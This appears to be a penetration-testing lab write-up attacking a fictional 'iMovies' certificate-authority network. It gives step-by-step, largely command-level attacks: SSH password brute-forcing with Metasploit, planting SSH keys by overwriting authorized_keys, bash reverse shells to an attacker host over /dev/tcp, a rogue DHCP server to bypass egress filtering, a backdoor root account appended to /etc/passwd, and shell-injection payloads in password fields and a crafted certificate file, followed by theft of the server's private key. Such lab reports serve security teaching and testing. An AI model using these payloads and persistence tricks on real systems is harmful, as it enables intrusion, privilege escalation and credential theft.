# Backdoors

## Simple backdoor

### Blackbox testing

While attached to the "inet" network, we scan for possible targets.

```shell
nmap -p0- -v -A -T4 -Pn 192.168.2.1,11
```

We see that the host at 192.168.2.11 (admin-server) has an open TCP port 22 with an SSH service running on it. If we try to connect to it we get

```shell
*****************************************************************
* Only the user cabackup can login without a rsa key            *
....
```

We can therefore try a dictionary bruteforce attack using a tool like metasploit. We get a wordlist (for example the [1000 most common passwords list](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt)) and use the metasploit module `auxiliary/scanner/ssh/ssh_login`

```shell
msfconsole
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME cabackup
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOST 192.168.2.11
msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE 10-million-password-list-top-1000.txt
msf6 auxiliary(scanner/ssh/ssh_login) > run
```

The attack succeeds - the password for the user `cabackup` is `password`

We can the connect to the server via SSH.

We find a key which allows us to connect to the ca server. Unfortunately, we are informed by a "README" file that this key is limited to only transferring files via `scp` and executing "a backup script" as the user "laurin".

Such restrictions can usually be found in the file ".ssh/authorized_keys". We can transfer the file to inspect it with 

```shell
scp -i .ssh/caserver laurin@192.168.1.21:.ssh/authorized_keys ./
```

From the received file, we see that the commands are filtered using a script

```shell
...
command="/home/laurin/.ssh/allowed-commands.sh $SSH_ORIGINAL_COMMAND"
...
```

A very simple way that we could get around this is by simply installing our own, unrestricted ssh key by overwriting `authorized_keys` with an updated version containing our ssh key.

```shell
scp -i .ssh/caserver laurin@192.168.1.21:.ssh/authorized_keys ./malicious_keys

ssh-keygen -t rsa -q -f "./bad" -N ""

cat bad.pub >> ./malicious_keys

scp -i .ssh/caserver ./malicious_keys laurin@192.168.1.21:.ssh/authorized_keys

ssh -i bad laurin@192.168.1.21
```

And we have unrestricted (but unfortunately unprivileged) SSH access.

We can now look at some configuration files.

In addition to looking executing scp, the previous key can also execute the command `./backup/backup.sh emergency` as can be seen in `.ssh/allowed-commands.sh`. This opens up another attack vector: we can replace `backup.sh` with a malicious script and execute it - for example one that allows us to get a reverse shell.

``

```bash
# Create reverse shell pointing to the ip of the admin-server
echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.1.11/1337 0>&1'" > reverse.sh

# In another terminal
nc -l -n -vv -p 1337

scp -i .ssh/caserver ./reverse.sh laurin@192.168.1.21:./backup/backup.sh

ssh -i .ssh/caserver laurin@192.168.1.21 "./backup/backup.sh emergency"
```

If we attempt that, we are do not get a reverse ssh connection. Inspecting firewall logs with `dmesg` using the ssh connection to the ca server, we see that the packets are being dropped.

Unfortunately, we cannot view firewall rules, since we are an unprivileged user(and we do not have the password to use `sudo`). We can still look at some interesting files though.

If we look at what network interfaces there are available with `ip a`, we see `enp0s3` and `enp0s8`. `enp0s8` does not seem to have an IP assigned to it.

We can see the network configuration of the interfaces at `/etc/netplan/00-installer-config.yaml`.

Seems like `enp0s8` was configured to access the internet, judging by the presence of the `nameservers` entry. It was also configured to get its IP from a DHCP server `dhcp4: true`

Since it is likely that there are no firewall rules set up for outgoing connections on this interface, or in the worst case only connections to ports 80 and 443 are allowed, we could exploit this to gain a reverse shell.

We attach our machine to the same network that the adapter `enp0s8` is attached to (i.e. `inet`). If we listen to the traffic with wireshark, we indeed see DHCP-discover requests.

We then set up a simple dhcp server using either `isc-dhcp-server` or making our own using python and library like `pydhcplib`/`scapy`.

We wait for a bit, looking at the traffic in wireshark to see when the DHCP client of the CA is issued an ip address.

When that happens, we could attempt to attack the machine again.

On the attacker machine:

```bash
# Need sudo as port 80 is a privileged port
sudo nc -l -n -vv -p 80
```

From the cabackup@admin-server:

```bash
echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/ATTACKER_MACHINE_IP/80 0>&1'" > reverse.sh

scp -i .ssh/caserver ./reverse.sh laurin@192.168.1.21:./backup/backup.sh

ssh -i .ssh/caserver laurin@192.168.1.21 "./backup/backup.sh emergency"
```

And we got ourselves another shell :D.

On the ca server, we find the origin backup script `bckp_backup_script.sh`. Reading it, we can see that it's possible to transfer files over `scp` using a the key `.ssh/archive` to the archive machine as the user `caserver`. We try our luck with an ssh connection:

```shell
ssh -i /home/laurin/.ssh/archive caserver@archive
```

but we get

```shell
PTY allocation request failed on channel 0
```

and the shell hangs. We might be limited by yet another rule in `authorized_keys` on the remote machine.

This time, trying to extract the `authorized_keys` with scp fails.

Let's see what else we can do...

Out of curiosity, we can execute the backup script. The output it filled with permission denied errors. This means that whatever daemon(`cron` and the like) is executing the script, it is likely running with elevated privileges.

So, leave the malicious script as is and patiently wait with the netcat listener on the attacker's machine...

```bash
# Need sudo as port 80 is a privileged port
sudo nc -l -n -vv -p 80
```

At some point in time, the script gets executed by the daemon, and we get a root shell!

We can then add a root user account so we can `su` to a privileged user from any unprivileged shell.

```shell
root@ca-server# echo "pwn:$(openssl passwd -1 -salt NaCl iamroot):0:0:root:/root:/bin/bash" | tee -a /etc/passwd
```

Then, from any shell on the CA server, we get root access by

```shell
unprivileged@ca-server$ su pwn -
```

and entering `iamroot` when we're prompted for the password.

We can now access every file - CA private key. SSH host keys, install packages, etc.

Going back to the way files are backed up to the archive server and backup script, we see that files are copied over using

```shell
scp -i /home/laurin/.ssh/archive -r $1/ caserver@archive:
```

This command recursively copies a directory to the home directory of the `caserver` user on the archive machine.

A particularly interesting directory inside any user's home directory is `.ssh` where (guess what) the `authorized_keys` file is. We can therefore overwrite `authorized_keys` with a key that is not restricted. So if we do:

```shell
laurin@ca-server:~$ mkdir malicious && cd malicious
laurin@ca-server:~/malicious$ ssh-keygen -t rsa -q -f "./bad_v2" -N ""
laurin@ca-server:~/malicious$ mkdir .ssh
laurin@ca-server:~/malicious$ cat bad_v2.pub > .ssh/authorized_keys
laurin@ca-server:~/malicious$ scp -i /home/laurin/.ssh/archive -r .ssh/ caserver@archive:
```

This installs our key(Note that it also overwrites `laurin`'s key and we need to reinstall it to preserve any old functionality that relies on `ssh`-ing using this key).

We can now ssh into the archive server

```shell
laurin@ca-server:~$ ssh -i ~/malicious/bad_v2 caserver@archive
```

On the archive server, there does not seem to be an obvious method for privilege escalation.

### Whitebox testing

Looking at the implementation of the CA server in `ca-server:/opt/Ca_Server/ca_server.py`:

```py
# Generate key pair
os.system(f"openssl genrsa -aes256 \
            -passout pass:{password} -out {key_out} 2048")

print("certificate request")
# Generate certificate request
os.system(f"openssl req -config {self.CONFIG_INTERM} \
            -key {key_out} -passin pass:{password} \
            -new -sha256 -subj {subject_option} \
            -out {request_out}")

print("sign cert")
# sign certificate
os.system(f"openssl ca -batch -config {self.CONFIG_INTERM} \
            -extensions server_cert -days 375 -notext -md sha256 \
            -in {request_out} \
            -out {cert_out}")

print("export to pkcs12")
os.system(f"openssl pkcs12 -export -inkey {key_out} \
            -passin pass:{password} -passout pass:{password} \
            -in {cert_out} -out {pkcs12_out}")
```

We see direct calls to `os.system` when doin operations with openssl. Guess what happens next.

We see that the `password` is inserted as a regular string and is likely to contain special characters because of security requirements. We can in theory get a reverse shell. To do this, we would also need to exploit the unfiltered outgoing traffic on the `enp0s8` interface and the DHCP mentioned earlier. Injection trough other x509 fields like `CN` could also be possible.

Unfortunately, we need a valid user account. This should not be a problem in the real world, as an agent could pretend to want to leak information to iMovies, but instead they'll just act as a double agent so that they get an account.

They could then log in and issue a certificate, entering a reverse shell payload instead of a password. Given that that the interface `enp0s8` is supposed to attach to the internet, is is possible that the attacker is not even attached to the internal network and is executing the whole operation remotely.

The process is as follows:

1. Go to `https://imovies.ch/` and log in

2. Go to `https://imovies.ch/certificates`

3. Setup DHCP server as before, start a listener on the attacker machine

```shell
sudo nc -l -n -vv -p 80 
```

4. In the `Issue new certificate` form, enter in both password fields

```text
;/bin/bash -c '/bin/bash -i >& /dev/tcp/ATTACKER_MACHINE_IP/80 0>&1';exit;
```

5. Click the `Issue` button. We got ourselves a shell.

Inspecting the certificate authentication procedure, we see that the certificate is sent over to the server. Then, on the CA server, in `/opt/Ca_Server/ca_server.py` the contents of the certificate are written to a file:

```py
  def verify_certificate(self, cert):
      cert_path = os.path.join(self.CERTS, "temp.cert.pem")
      os.system(f"touch {cert_path}")
      os.system(f"echo \"{cert}\" > {cert_path}") # <<<<<<<<<<
```

The value of `cert` is not validated and quotes are not escaped, so we have another shell injection. Furthermore, double quotes `"` allow for spawning of subshells using `$()`.
A side note - because the filename `temp.cert.pem` is not generated dynamically, concurrency issues can arise.

As certificate login is a publicly available feature, an adversary only needs to maliciously crafted `.pem` certificate file (some restrictions in regards to the network may still apply).

To exploit this vulnerability:

1. Generate a file with the following contents and name it `pwn.pem`:

```text
-----BEGIN CERTIFICATE-----
$(/bin/bash -c '/bin/bash -i >& /dev/tcp/ATTACKER_MACHINE_IP/80 0>&1')
-----END CERTIFICATE-----
```

2. Setup DHCP server as before, start a listener on the attacker machine

```shell
sudo nc -l -n -vv -p 80 
```

3. Navigate to `https://imovies.ch/` and in the certificate login form, select `pwn.pem` from the filesystem and submit it. We get a shell!

(**Note:**) We may be also able to use this to bypass authentication, by performing a shell command which copies a valid certificate from the system to the the temp file:


In both backdoors we are running as the user `www-data`.

From the spawned shell, we could steal the servers' private key:

```shell
www-data@ca-server:/opt/Ca_Server$ cat ./root/web_server.key.pem
```

The agent will then be able to decrypt all traffic. Neat!

Unfortunately the backup script inside `laurin`'s home directory is write protected and we cannot get root that way. But still, our access is sufficient to compromise iMovies journalists and agents and issue certificates without any regulation. We can set up a monitor that forwards all issued private keys to us - the possibilities are endless!

## Additional notes

1. When scanning all servers on the internal network, all of them have the same ssh host keys. If we manage to obtain the keypair of only one of the machines, then we can spoof any of the machines.
